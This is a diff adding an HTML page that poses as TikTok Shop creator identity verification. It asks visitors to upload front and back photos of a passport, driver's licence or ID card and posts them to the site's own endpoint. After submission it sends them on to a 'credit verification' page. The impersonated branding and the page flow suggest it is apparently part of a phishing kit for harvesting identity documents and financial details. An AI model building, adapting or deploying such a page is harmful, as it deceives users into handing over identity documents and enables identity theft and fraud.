@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;">
+  <title>Identity Verification</title>
+  <link rel="icon" href="/tiktok-icon.png">
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <img src="/tiktok-icon.png" alt="Loading" class="tiktok-icon">
+  </div>
+  <div class="container">
+    <h2>Identity Verification</h2>
+    <p>To become a TikTok Shop creator, please complete the below identity verification.</p>
+
+    <label>ID type</label>
+    <select id="idType" onchange="checkFormCompletion()">
+      <option value="">Select ID type</option>
+      <option value="Driver's License">Driver's License</option>
+      <option value="Passport">Passport</option>
+      <option value="ID Card">ID Card</option>
+    </select>
+
+    <label>ID issuing place</label>
+    <select id="idPlace" onchange="checkFormCompletion()">
+      <option value="">Select ID issuing place</option>
+      <option value="United States">United States</option>
+      <option value="Canada">Canada</option>
+      <option value="United Kingdom">United Kingdom</option>
+      <option value="Australia">Australia</option>
+      <option value="France">France</option>
+      <option value="Germany">Germany</option>
+      <option value="Japan">Japan</option>
+      <option value="South Korea">South Korea</option>
+      <option value="China">China</option>
+      <option value="India">India</option>
+      <option value="Brazil">Brazil</option>
+      <option value="Mexico">Mexico</option>
+      <option value="Russia">Russia</option>
+      <option value="Italy">Italy</option>
+      <option value="Spain">Spain</option>
+      <option value="Argentina">Argentina</option>
+      <option value="South Africa">South Africa</option>
+      <option value="Singapore">Singapore</option>
+      <option value="Thailand">Thailand</option>
+      <option value="Malaysia">Malaysia</option>
+      <option value="Philippines">Philippines</option>
+      <option value="Turkey">Turkey</option>
+      <option value="Saudi Arabia">Saudi Arabia</option>
+      <option value="New Zealand">New Zealand</option>
+    </select>
+
+    <label>Photos of ID document</label>
+    <p>Make sure you have sufficient lighting, no glare, and nothing obscuring your document.</p>
+    <input type="file" id="frontFile" accept=".png, .jpeg, .jpg" onchange="checkFormCompletion()">
+    <input type="file" id="backFile" accept=".png, .jpeg, .jpg" onchange="checkFormCompletion()">
+
+    <p>Upload photos of the front and back of your ID document. Files must be under 5 MB, no smaller than 300 x 300 pixels and no larger than 8000 x 8000 pixels, and in one of the following formats: PNG, JPEG, JPG.</p>
+    
+    <p>By clicking "Submit", you acknowledge that TikTok can process the information you provided for the purposes of compliance or regulatory requirements. By submitting your information, you have read
+      <span class="policy-link" onclick="showPolicy()">TikTok Privacy Policy</span>.
+    </p>
+
+    <button id="submitBtn" class="button" disabled>Submit</button>
+  </div>
+
+  <div id="policyPage">
+    <div id="policyContent">
+      <button id="backButton" onclick="hidePolicy()">←</button>
+      <h2>TikTok Privacy Policy</h2>
+      <p>All information submitted for identity verification will be processed automatically or manually.</p>
+      <p>Depending on the method required to verify your details, the verification time can vary from a few seconds to up to 1 business day.</p>
+      <p>To avoid delays in processing your application, it is important that all information provided meets our verification requirements. You may be asked to submit additional documents if the information you submitted is incomplete or does not meet our requirements. Please note that during the verification process, you can upload your ID document only once.</p>
+    </div>
+  </div>
+
+  <script>
+    function checkFormCompletion() {
+      const idType = document.getElementById('idType').value;
+      const idPlace = document.getElementById('idPlace').value;
+      const frontFile = document.getElementById('frontFile').files[0];
+      const backFile = document.getElementById('backFile').files[0];
+      const submitBtn = document.getElementById('submitBtn');
+
+      if (idType && idPlace && frontFile && backFile) {
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.disabled = true;
+      }
+    }
+
+    function showPolicy() {
+      document.getElementById('policyPage').style.display = 'block';
+    }
+
+    function hidePolicy() {
+      document.getElementById('policyPage').style.display = 'none';
+    }
+
+    function showLoading() {
+      document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }
+
+    document.getElementById('submitBtn').onclick = async function() {
+      showLoading();
+      const idType = document.getElementById('idType').value;
+      const idPlace = document.getElementById('idPlace').value;
+      const frontFile = document.getElementById('frontFile').files[0];
+      const backFile = document.getElementById('backFile').files[0];
+
+      const formData = new FormData();
+      formData.append('idType', idType);
+      formData.append('idPlace', idPlace);
+      formData.append('frontFile', frontFile);
+      formData.append('backFile', backFile);
+
+      try {
+        const response = await fetch('/api/identity-verification', {
+          method: 'POST',
+          body: formData,
+        });
+        if (response.ok) {
+          window.location.href = '/credit_verification.html';
+        } else {
+          window.location.href = '/identity_verification_failed.html';
+        }
+      } catch (error) {
+        window.location.href = '/identity_verification_failed.html';
+      } finally {
+        hideLoading();
+      }
+    };
+  </script>
+</body>
+</html>
